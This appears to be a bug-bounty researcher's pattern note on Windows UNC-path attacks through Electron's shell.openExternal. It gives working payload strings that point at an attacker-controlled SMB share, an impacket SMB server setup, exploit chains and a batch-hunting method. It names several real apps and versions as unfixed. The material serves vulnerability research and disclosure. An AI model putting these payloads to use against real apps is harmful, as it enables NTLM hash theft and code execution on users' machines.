---
type: pattern
title: Pattern - shell.openExternal UNC RCE (Windows ShellExecute SMB primitive)
tags: [pattern, cwe-78, cwe-20, cwe-922, electron, windows, smb, ntlm, rce, bb-pattern]
status: active
last_updated: 2026-05-11
severity: P1 (CVSS 9.6 Critical, UI:R 2 interactions)
precedents: CVE-2018-1000136 (Electron contextIsolation), CVE-2022-29247 (Electron file://), CVE-2024-23739 (Discord macOS <=0.0.291), Slack 2020 RCE
---

# Pattern — shell.openExternal UNC RCE

## TL;DR

An Electron app calls `shell.openExternal(url)` somewhere in an IPC handler / scheme dispatcher, and `url` is attacker-controlled. On Windows, `shell.openExternal` internally calls `ShellExecuteEx` — an API that **accepts UNC paths** (`\\attacker\share\poc.exe`), which will:

1. Initiate NTLM authentication against the attacker's SMB server → **the NTLMv2 hash is always captured**
2. Retrieve a PE / HTA / LNK from the SMB share
3. Trigger the "Open File - Security Warning" (IAttachmentExecute) dialog
4. If the user clicks Run → **arbitrary code execution** (this holds even on a fully-patched Windows 11)

**On Windows, a UNC path is itself a shell primitive.** You don't need to find a `child_process.exec`.

## Root-cause Ingredients

### Ingredient 1: Unvalidated `shell.openExternal`

```javascript
ipcMain.on("navigateObj.openWindow", (event, { url, isInternal, id }) => {
  if (isInternal) {
    new BrowserWindow({ ..., webPreferences: { preload } }).loadURL(url);
  } else {
    // vulnerable — url can be \\attacker\share\poc.exe
    shell.openExternal(url);
  }
});
```

### Ingredient 2: A path that reaches the sink

Usually requires chaining an entrypoint:
- **Custom scheme handler injection** ([[Pattern - Electron Custom Scheme Handler Injection]]) → an `executeJavaScript` call invokes `window.navigateObj.openWindow(UNC)`
- **Stored XSS** inside the app's webContent → same as above
- **Preload exposure** to an attacker-controlled page ([[Pattern - Electron Preload Injection Chain]])

## Detection Methodology

1. **Find every `shell.openExternal` call site**: grep `shell\.openExternal\|shell\.openPath\|shell\.showItemInFolder`
2. **Trace each sink's input source**:
   - From an `ipcMain.on/handle` argument? → check for sender-frame validation
   - From `executeJavaScript(eventData)`? → an injection point
   - From server JSON / a notification payload? → an injection point
3. **Check URL filtering**: is there a scheme allowlist (`https:` only)? Is UNC (`\\\\`-prefixed) rejected?
4. **If zero validation is found anywhere** = a systemic CWE-20 → a single advisory can cover every sink

## Live Verification SOP (Windows 11 + Kali VM)

```bash
# 1. Attacker SMB server (Kali)
mkdir share
cp /usr/share/windows-resources/binaries/whoami.exe share/poc.exe
sudo impacket-smbserver SHARE share -smb2support -username test -password test123

# 2. Trigger from the Electron app (via a chained entrypoint)
# e.g. myapp://?action=answerCall&eventData=window.navigateObj.openWindow("\\\\\\\\KALI_IP\\\\SHARE\\\\poc.exe",false,"")

# 3. Observe
# (a) Kali terminal shows: [*] User WINDOWS\test authenticated successfully
# (b) Windows 11 shows: Open File - Security Warning
# (c) Clicking "Run" → poc.exe executes
```

**Interaction-count evaluation** (confirmed live on fully-patched Windows 11):

| Payload type | Interactions | NTLM theft? | Execution? | Status |
|--------------|--------------|-------------|------------|------|
| UNC `.exe` | 2 (browser link + Run dialog) | yes | yes | LIVE confirmed |
| UNC `.hta` | 2 (same as above; HTA shows as "HTML Application") | yes | yes | LIVE confirmed |
| `search-ms:query=X&crumb=location:\\IP\share` | **1** (browser link only) | yes | no (NTLM only) | LIVE confirmed |
| `smb://attacker/share` | 2 (dialog: "connect?") | yes | no | Confirmed gap in another Electron app's blocklist |
| WebDAV + `http://` | — | — | no | Fully blocked by Edge SmartScreen |
| `ms-msdt:` (Follina) | — | — | no | Patched by Microsoft |
| `ms-appinstaller:` | — | — | no | Disabled by default |

**0-dialog code execution has not been found on a fully-patched Windows 11** (IAttachmentExecute cannot be avoided). Honest framing: "**1-click NTLM theft + 1-click .exe execution via UNC path**," not 0-click RCE.

---

## New-app Test Checklist (mandatory for every newly found sink)

Once a `shell.openExternal(url)` with no validation is found, **all variants must be systematically tested**, not just `search-ms:`.

```
[ ] 1. Variant B: search-ms: (zero-dialog NTLM)
      payload: search-ms:query=SystemUpdate&crumb=location:\\<IP>\SHARE&displayname=Windows+Update

[ ] 2. Variant A-hta: UNC .hta (1 dialog → RCE)
      payload: \\<IP>\SHARE\poc.hta

[ ] 3. Variant A-exe: UNC .exe (1 dialog → RCE)
      payload: \\<IP>\SHARE\poc.exe

[ ] 4. smb:// (often missing from blocklists)
      payload: smb://<IP>/SHARE
      → if it passes validation: shows a dialog → NTLM (one more dialog than search-ms:)

[ ] 5. Confirm defense coverage
      If the app has a blocklist: check whether it includes smb:, ftp:, ldap: (commonly missed)
      If the app uses a new URL() allowlist: check whether UNC \\ throws a TypeError (if so → blocked)
      If the app uses isHttpLink(): check whether smb:// returns false → does that block it or let it through?
```

**Equivalence shortcut**: several apps audited in this pattern had zero URL validation at all, so every variant applies equally without needing to individually confirm each one live; report language can note "zero validation observed = all previously LIVE-confirmed variants apply theoretically."

## Variants

### Variant A: UNC path (.exe / .hta / .lnk)

The strongest primitive. `.hta` has an advantage: the payload is script content, no pre-compiled binary needed (a 283-byte VBScript can launch calc.exe).

### Variant B: search-ms + SMB

```
search-ms:query=SystemUpdate.sln&crumb=location:\\IP\share&displayname=Windows Update
```

`shell.openExternal(...)` → Explorer opens it directly → SMB auth fires → **zero-dialog NTLMv2 capture**. No .exe execution, but NTLM theft is zero-friction.

### Variant C: file:// path reading a local file

`shell.openExternal("file:///C:/Windows/System32/...")` isn't RCE, but if a preload script is also present, the spawned file:// window still attaches the preload, enabling recursive injection.

## Real-world Examples

| Vendor / App | Year | Variant | Sink | Note |
|--------------|------|---------|------|------|
| **Electron IM app A** (ACME-001) | 2026 | A (.exe + .hta) | `navigateObj.openWindow → shell.openExternal` with no validation | 9.6, LIVE confirmed |
| **Electron IM app A** (ACME-002) | 2026 | A | `userCardObj.clickUserCardEvent` channel-type injection → same sink | Second independent path, LIVE confirmed |
| **Electron IM app A** (search-ms test round) | 2026 | B | search-ms+SMB | 0-dialog NTLM |
| **Electron IM app B** (ACME-003) | 2026 | B | `api/shell.js ipcMain.on('shell-openExternal', url => shell.openExternal(url))` reached via a real-time-messaging bridge module | Confirmed via static analysis (Grade B); reported to a bug bounty program |
| **Rocket.Chat Desktop** | 2026 | B | `src/videoCallWindow/ipc.ts` — `video-call-window/open-url` handler; Jitsi webview with `nodeIntegration:true` | Confirmed via static analysis (Grade B); new module introduced after CVE-2022-44567; reported via H1 VDP |
| **Synology Chat Client** | 2026 | B | `js/index.<hash>.js` — `onWebviewNewWindow` disposition="other" bypass; Electron 17.4.7 | Confirmed via static analysis (Grade B); DSM URL filtering unconfirmed; reported via H1 |
| **Mattermost Desktop** (smb:// gap) | 2026 | smb | `BLOCKED_PROTOCOLS` misses `smb:`; `search-ms:`/UNC are both already blocked; `smb://` → dialog path → NTLM (1 click) | Static analysis (Grade B Low); pending submission |
| **Ferdium** v7.1.2 | 2026 | B | `contextMenuBuilder.js buildMenuForLink` → `openExternalUrl(linkURL, true)` bypasses `skipValidityCheck`; `ALLOWED_PROTOCOLS` allowlist is bypassed; `window.open`/IPC path is validated; attack: HTML email `search-ms:` link → right-click "Open Link" | Static analysis (Grade B); no bounty program; disclosed via GitHub Issues |
| **Franz** v5.11.0 | 2026 | B | `serviceContextMenuTemplate.ts` "Open Link in Browser" → `shell.openExternal(props.linkURL)` with **no validation at all** (no `skipValidityCheck` flag, called directly); `ALLOWED_PROTOCOLS` allowlist is only applied in AppStore/setWindowOpenHandler/new-window paths; 80+ embedded service webviews can all serve as the delivery vector; more direct than the Ferdium case (no bypass required) | Static analysis (Grade B); no bounty program; disclosed via GitHub Issues |
| **Beeper Desktop** v4.2.808 | 2026 | B (Low) | `setWindowOpenHandler` → `shell.openExternal(...)` with no validation; the app's `ExtLink` helper only blocks `javascript:`/`file:`, so `search-ms:` gets through; DOMPurify (`ALLOWED_URI_REGEXP=/^https?://|^mailto:/`) mitigates the HTML-body path; link-preview URLs are unfiltered; attack: chat link → `target="_blank"` → `window.open(search-ms:...)` → NTLMv2 | Static analysis (Grade B Low); bounty-program scope unconfirmed |
| Discord (CVE-2024-23739) | 2024 | A | macOS <=0.0.291 `openExternalForce`; patched; `saferShellOpenExternal` blocklist is the current defense | macOS-specific, distinct from CVE-2024-27288 |
| Slack 2020 (HackerOne #783877) | 2020 | A | `<a href>` UNC click | $1750 bounty |

## Defense

```javascript
// vulnerable
ipcMain.on("openExternal", (e, url) => {
  shell.openExternal(url);
});

// safe
const SAFE_PROTOCOLS = ["https:", "mailto:"];
ipcMain.on("openExternal", (e, url) => {
  // 1. sender-frame validation
  if (!event.senderFrame.url.startsWith("https://my-app.com/")) return;
  // 2. parse the URL + scheme allowlist
  let u;
  try { u = new URL(url); } catch { return; }
  if (!SAFE_PROTOCOLS.includes(u.protocol)) return;
  // 3. reject UNC (URL parsers usually treat `\\` as a file: prefix anyway)
  if (url.startsWith("\\\\") || url.startsWith("//")) return;
  // 4. reject special schemes (search-ms / ms-* / etc)
  if (u.protocol.startsWith("ms-") || u.protocol === "search-ms:") return;
  shell.openExternal(url);
});
```

**Electron's built-in option**: `shell.openExternal(url, { activate: false })` does not block UNC — scheme allowlisting has to be implemented at the app layer.

## Filing & Severity

- **Solo CVSS (Windows-only RCE)**: 9.6 Critical (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
- **Do not write 0-click**: a dialog always appears — honestly state UI:R
- **Impact framing**:
  - Good: "LIVE-VERIFIED attacker-controlled remote code execution via UNC path, requiring Windows security confirmation (UI:R)"
  - Good: "1-click NTLMv2 hash exfiltration enabling Pass-the-Hash / NTLM relay attacks"
  - Bad: "arbitrary code execution" written alone (must be paired with UI:R)
  - Bad: "0-click RCE" (unless a true 0-dialog primitive is actually found)
- **macOS / Linux**: `shell.openExternal` doesn't trigger SMB there; macOS has a `smb://` URL handler but its Finder dialog is stricter than Windows 11's — this pattern is **Windows-specific**

## Chains

- Full 1-click takeover: **custom scheme handler injection → preload exposure → navigateObj.openWindow(UNC) → shell.openExternal → ShellExecuteEx → SMB → PE execution**
- Pure NTLM theft: **any XSS in the app's webContent → window.navigateObj.openWindow(search-ms+SMB)** → 0-dialog NTLMv2 capture

## Batch Audit Methodology (Electron IM Batch Hunt)

**Quick triage (10 min/app):**
```bash
npx asar extract app.asar /tmp/extracted
grep -rn "openExternal\|shell\.open" /tmp/extracted/ --include="*.js"
```

**Decision tree:**
```
0 hits → SKIP
hits found → read the surrounding code:
  allowlist (http/https only) → SAFE
  blocklist → check it against the dangerous-protocol list below → gaps = FINDING
  zero validation → 0-day FINDING
```

**Three-layer kill chain (for every Electron app):**
```
Layer 1: Server   — does the server preserve non-http schemes in messages?
Layer 2: Renderer — does the DOM contain <a href="non-http:...">?
Layer 3: Client   — does Electron's blocklist/allowlist catch it?
Exploitable = L1 pass x L2 pass x L3 pass
```

**Dangerous Windows protocols (blocklist audit checklist):**
`search-ms:` (zero-dialog NTLMv2) / `ms-msdt:` (Follina RCE) / `ms-officecmd:` / `smb:` / `ftp:` / `file:` / `telnet:` / `ssh:` / `ms-settings:` (UAC bypass chain)

**CVE incomplete-fix expansion:**
1. Find a CVE's fix (e.g. CVE-2024-23739) → read the fix = a blocklist
2. Audit the blocklist for completeness → find gaps
3. Search other apps using the same fix pattern → more findings
4. Search apps with NO fix applied at all → zero-validation findings

**Data point:** 37 apps audited → 8 findings (1.3/hr) — combining a mature pattern with batch-target auditing gave the highest yield observed.

## Related

- [[Pattern - Windows UNC Path Primitive]] — the meta-pattern: this is the T1-sink case (shares the OS-level primitive with T2/T3/T4 sinks)
- [[Pattern - Electron Custom Scheme Handler Injection]] — common trigger entrypoint
- [[Pattern - Electron Preload Injection Chain]] — common trigger entrypoint
- [[Pattern - Electron Preload Origin-Agnostic Injection]] — 0-click MITM trigger
- [[Pattern - JWT File-based Validation UNC NTLM Oracle]] — sibling T2 sink (same OS primitive, read-only)
- [[Pattern - Electron will-download Path Traversal]] — sibling T3 sink (same OS primitive, write)
- [[Pattern - IPC Socket Hijack]] — another desktop-app IPC attack surface (Unix socket / named pipe)
- [[Lessons Learned]] — `shell.openExternal(UNC)` is a TRUE RCE primitive
- [[Lessons Learned]] — three-layer filtering model / batch methodology / incomplete CVE fixes / aggregator-app illusion of coverage
- [[Lessons Learned]] — five-stage IPC reverse-engineering approach / attack-chain design / protocol checklist / observing the UI beats pure RE / asar grading method / CVE-fix auditing

## Session-Mined Additions

- **`ftp://` bypass primitive**: some apps' `BLOCKED_PROTOCOLS` blocklist omits `ftp://`, which can trigger Windows credential relay (NTLM). Add `ftp://attacker.com/` to the standard test checklist.
- **Catch-all sink reachability analysis**: if the `openExternal` entrypoint has no upstream URL filtering (a true catch-all), every scheme becomes a target. Audit steps: (1) trace the URL from renderer to main process; (2) check whether a blocklist exists; (3) if it's a catch-all, individually test `smb://`, `ftp://`, `ms-its://`, `search-ms://`, `mhtml:`.
- **Source-tracing method**: check whether a scheme is in the blocklist via `grep BLOCKED_PROTOCOLS` / `allowedSchemes` — if `ms-its://` is blocked but `ftp://` isn't in the list, that asymmetry is itself an attack vector.
- **Report every variant, not just one**: describing only Variant B (`search-ms:`) is not enough — list every reachable dangerous scheme, or the triager may mistakenly conclude "exec unreachable."
